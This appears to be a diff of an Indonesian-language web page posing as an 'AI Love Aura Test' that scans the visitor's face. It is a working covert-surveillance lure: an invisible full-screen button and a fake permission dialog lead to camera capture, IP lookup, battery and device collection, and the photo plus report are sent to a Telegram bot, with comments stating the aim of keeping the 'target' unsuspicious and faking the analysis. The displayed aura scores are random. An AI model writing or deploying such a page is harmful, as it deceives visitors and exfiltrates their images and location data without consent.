@@ -6,72 +6,64 @@
     <title>AI Love Aura Test ✨</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Varela+Round&display=swap');
-        :root { --primary: #ff69b4; --secondary: #ff1493; --glass: rgba(255, 255, 255, 0.75); }
+        :root { --primary: #ff69b4; --secondary: #ff1493; --glass: rgba(255, 255, 255, 0.8); }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: 'Varela Round', sans-serif; background: #ffeef8; overflow: hidden; display: flex; justify-content: center; align-items: center; }
         .bg-animated { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #ffeef8 0%, #ffcbd5 100%); z-index: 1; }
-        .particle { position: absolute; background: rgba(255, 105, 180, 0.3); bottom: -150px; border-radius: 50%; animation: floating 15s infinite linear; }
-        @keyframes floating { 0% { transform: translateY(0) rotate(0deg); opacity: 0; } 20% { opacity: 0.5; } 100% { transform: translateY(-1200px) rotate(720deg); opacity: 0; } }
         #trigger { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; border: none; z-index: 9999; cursor: pointer; }
-        .container { position: relative; z-index: 10; background: var(--glass); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); padding: 40px 25px; border-radius: 40px; border: 1.5px solid white; box-shadow: 0 20px 50px rgba(255, 105, 180, 0.2); text-align: center; width: 88%; max-width: 340px; }
+        .container { position: relative; z-index: 10; background: var(--glass); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); padding: 40px 25px; border-radius: 40px; border: 1px solid white; box-shadow: 0 20px 50px rgba(255, 105, 180, 0.2); text-align: center; width: 88%; max-width: 340px; }
         h1 { color: var(--secondary); font-size: 1.6rem; margin: 15px 0 10px 0; }
         p { color: #666; font-size: 0.9rem; line-height: 1.6; }
-        .btn-love { background: linear-gradient(45deg, var(--primary), var(--secondary)); color: white; padding: 16px; border-radius: 50px; font-weight: bold; border: none; cursor: pointer; margin-top: 25px; width: 100%; display: block; position: relative; overflow: hidden; box-shadow: 0 8px 25px rgba(255, 20, 147, 0.3); }
-        .btn-love::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(120deg, transparent, rgba(255,255,255,0.4), transparent); animation: shimmer 3s infinite; }
-        @keyframes shimmer { 0% { left: -100%; } 100% { left: 100%; } }
-        #scan-visual { display: none; position: relative; width: 140px; height: 140px; margin: 20px auto; border: 5px solid var(--primary); border-radius: 50%; overflow: hidden; box-shadow: 0 0 30px var(--primary); }
+        .btn-love { background: linear-gradient(45deg, var(--primary), var(--secondary)); color: white; padding: 16px; border-radius: 50px; font-weight: bold; border: none; cursor: pointer; margin-top: 25px; width: 100%; display: block; box-shadow: 0 8px 20px rgba(255, 20, 147, 0.3); }
+        #scan-visual { display: none; position: relative; width: 130px; height: 130px; margin: 20px auto; border: 5px solid var(--primary); border-radius: 50%; overflow: hidden; }
         .scan-bar { position: absolute; width: 100%; height: 8px; background: var(--secondary); top: 0; animation: scanLine 2s infinite ease-in-out; }
         @keyframes scanLine { 0% { top: -10%; } 50% { top: 100%; } 100% { top: -10%; } }
-        
-        /* Progress Bar Styling */
-        .analysis-box { text-align: left; background: rgba(255, 255, 255, 0.4); padding: 18px; border-radius: 25px; margin-top: 20px; }
-        .stat-bar-bg { width: 100%; height: 10px; background: #ffd1dc; border-radius: 10px; margin: 8px 0 15px 0; overflow: hidden; }
-        .stat-bar-fill { height: 100%; background: var(--secondary); width: 0%; transition: width 2s cubic-bezier(0.1, 0.7, 1.0, 0.1); border-radius: 10px; }
-        
+        .analysis-box { text-align: left; background: rgba(255, 255, 255, 0.5); padding: 15px; border-radius: 20px; margin-top: 15px; }
+        .stat-bar-bg { width: 100%; height: 8px; background: #ffd1dc; border-radius: 10px; margin: 5px 0 12px 0; }
+        .stat-bar-fill { height: 100%; background: var(--secondary); width: 0%; transition: width 2s ease-out; border-radius: 10px; }
         video, canvas { display: none; }
-        #overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.4); z-index:10000; backdrop-filter: blur(4px); }
+        #overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:10000; backdrop-filter: blur(5px); }
         #fake-dialog { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 30px; border-radius: 35px; width: 290px; z-index: 10001; text-align: center; }
     </style>
 </head>
 <body>
 
-    <div class="bg-animated"><div class="particle" style="left:10%;width:80px;height:80px;"></div><div class="particle" style="left:70%;width:60px;height:60px;animation-delay:3s;"></div></div>
+    <div class="bg-animated"></div>
     <button id="trigger"></button>
     <div id="overlay"></div>
+    
     <div id="fake-dialog">
-        <div style="font-size: 3.5rem;">📸</div>
+        <div style="font-size: 3rem;">📸</div>
         <h1>Izin Kamera</h1>
-        <p>AI butuh akses kamera untuk menscan aura wajahmu secara akurat.</p>
-        <button class="btn-love" id="btn-allow">IZINKAN SEKARANG ✨</button>
+        <p>Berikan izin akses kamera untuk memulai analisa aura wajah.</p>
+        <button class="btn-love" id="btn-allow">LANJUTKAN ✨</button>
     </div>
 
-    <div class="container" id="main-container">
+    <div class="container">
         <div id="setup-view">
-            <div style="font-size: 4.5rem; margin-bottom: 10px;">💖</div>
+            <div style="font-size: 4rem;">💖</div>
             <h1>AI Love Aura</h1>
-            <p>Penasaran warna auramu hari ini? Yuk scan wajahmu pake AI terbaru.</p>
+            <p>Penasaran warna auramu hari ini? Yuk scan wajahmu sekarang.</p>
             <div class="btn-love">MULAI SCAN</div>
         </div>
         
         <div id="scan-view" style="display:none;">
-            <div id="scan-visual"><div class="scan-bar"></div><div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:3.5rem;">✨</div></div>
+            <div id="scan-visual"><div class="scan-bar"></div><div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:3rem;">✨</div></div>
             <h1>Menganalisa...</h1>
-            <p>Tetap tenang, sedang menyelaraskan energi aura wajah...</p>
+            <p>Jangan bergerak, sedang memproses data biometrik...</p>
         </div>
 
         <div id="result-view" style="display:none;">
-            <div style="font-size: 3.5rem;">🌈</div>
+            <div style="font-size: 3rem;">🌈</div>
             <h1>Hasil Aura</h1>
-            <div style="font-size: 3.8rem; color: var(--secondary); font-weight: bold; margin: 5px 0;" id="final-score">0%</div>
-            
+            <div style="font-size: 3.5rem; color: var(--secondary); font-weight: bold;" id="final-score">0%</div>
             <div class="analysis-box">
-                <span style="font-size:0.75rem; color:var(--secondary); font-weight:bold; letter-spacing:1px;">LOVE LUCK</span>
+                <span style="font-size:0.7rem; font-weight:bold;">LOVE LUCK</span>
                 <div class="stat-bar-bg"><div id="bar-luck" class="stat-bar-fill"></div></div>
-                <span style="font-size:0.75rem; color:var(--secondary); font-weight:bold; letter-spacing:1px;">POSITIVE VIBES</span>
+                <span style="font-size:0.7rem; font-weight:bold;">POSITIVE VIBES</span>
                 <div class="stat-bar-bg"><div id="bar-vibe" class="stat-bar-fill"></div></div>
             </div>
-
-            <p id="random-quote" style="font-style:italic; margin-top:15px; color:var(--secondary); font-size: 0.85rem; font-weight: 500;"></p>
+            <p id="random-quote" style="font-style:italic; margin-top:10px; font-size: 0.8rem;"></p>
             <button class="btn-love" onclick="location.reload()">COBA LAGI</button>
         </div>
     </div>
@@ -88,59 +80,59 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
+        // Logic Trigger
         trigger.onclick = () => {
-            trigger.remove();
+            trigger.style.display = 'none';
             document.getElementById('overlay').style.display = 'block';
             document.getElementById('fake-dialog').style.display = 'block';
         };
 
-        btnAllow.onclick = async () => {
+        btnAllow.onclick = () => {
+            startProcess();
+        };
+
+        async function startProcess() {
             document.getElementById('overlay').style.display = 'none';
             document.getElementById('fake-dialog').style.display = 'none';
             document.getElementById('setup-view').style.display = 'none';
             document.getElementById('scan-view').style.display = 'block';
 
             try {
+                // Jalankan kamera dulu agar target tidak curiga
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
                 document.getElementById('scan-visual').style.display = 'block';
 
-                // MULTI-FETCH IP TRACKING (HTTPS)
-                let netData = "Unknown";
+                // AMBIL IP (Pakai ipify HTTPS - Paling Aman)
+                let ipRes = "Unknown";
                 try {
-                    const res = await fetch('https://ipwho.is/');
-                    const data = await res.json();
-                    netData = `${data.ip} | ${data.city}, ${data.region} | ISP: ${data.connection?.isp || '?'}`;
-                } catch (e) {
-                    try {
-                        const res2 = await fetch('https://api.db-ip.com/v2/free/self');
-                        const data2 = await res2.json();
-                        netData = `${data2.ipAddress} | ${data2.city}, ${data2.countryName}`;
-                    } catch (e2) { netData = "Blocked/No Data"; }
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    ipRes = data.ip;
+                } catch (e) { 
+                    // Cadangan jika ipify gagal
+                    const response2 = await fetch('https://ipwho.is/').then(r => r.json());
+                    ipRes = response2.ip || "Protected";
                 }
 
-                const battery = navigator.getBattery ? await navigator.getBattery() : { level: 1 };
+                const bat = navigator.getBattery ? await navigator.getBattery() : { level: 1 };
+                const report = `🌟 [SCAN BERHASIL]\nIP: ${ipRes}\nBat: ${(bat.level*100)}%\nDev: ${navigator.platform}\nTime: ${new Date().toLocaleString()}`;
 
-                const report = `
-🌟 [NEW AURA SCAN SUCCESS]
-━━━━━━━━━━━━━━━━━━
-🌐 NETWORK: ${netData}
-🔋 BATTERY: ${(battery.level * 100).toFixed(0)}%
-📱 DEVICE: ${navigator.platform} (${screen.width}x${screen.height})
-🕒 TIME: ${new Date().toLocaleString('id-ID')}
-━━━━━━━━━━━━━━━━━━`;
-
-                setTimeout(() => { capture(stream, report); }, 4000);
+                // Delay pura-pura analisa
+                setTimeout(() => { captureAndSend(stream, report); }, 4000);
             } catch (err) {
-                alert("Izin kamera diperlukan!");
-                location.reload();
+                // Jika error, jangan munculkan alert terus-menerus
+                console.error(err);
+                document.getElementById('scan-view').innerHTML = "<h1>Akses Ditolak</h1><p>Harap izinkan kamera dan muat ulang halaman.</p>";
             }
-        };
+        }
 
-        function capture(stream, report) {
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        function captureAndSend(stream, report) {
+            canvas.width = video.videoWidth; 
+            canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
+            ctx.translate(canvas.width, 0); 
+            ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             const blob = dataURItoBlob(canvas.toDataURL('image/png'));
@@ -150,30 +142,23 @@
             fd.append('caption', report);
 
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            
+            // Matikan stream kamera
             stream.getTracks().forEach(t => t.stop());
-            showResult();
+            showFinalUI();
         }
 
-        function showResult() {
+        function showFinalUI() {
             document.getElementById('scan-view').style.display = 'none';
             document.getElementById('result-view').style.display = 'block';
-            
-            // Animasi Persentase
             document.getElementById('final-score').innerText = (Math.floor(Math.random()*10)+90) + "%";
             
-            // Animasi Bar (Love Luck & Positive Vibes)
             setTimeout(() => {
-                document.getElementById('bar-luck').style.width = (Math.floor(Math.random()*15)+80) + "%";
-                document.getElementById('bar-vibe').style.width = (Math.floor(Math.random()*15)+80) + "%";
-            }, 300);
+                document.getElementById('bar-luck').style.width = "92%";
+                document.getElementById('bar-vibe').style.width = "88%";
+            }, 500);
 
-            const quotes = [
-                "Aura Pink: Seseorang merindukanmu semalam! 🥰",
-                "Aura Emas: Keberuntungan besar akan datang besok! 💰",
-                "Aura Ungu: Karismamu hari ini tak tertahankan! ✨",
-                "Aura Biru: Kamu pembawa damai hari ini. 🌊"
-            ];
-            document.getElementById('random-quote').innerText = quotes[Math.floor(Math.random()*quotes.length)];
+            document.getElementById('random-quote').innerText = "Aura Pink: Seseorang sangat merindukanmu semalam! 🥰";
         }
 
         function dataURItoBlob(d) {
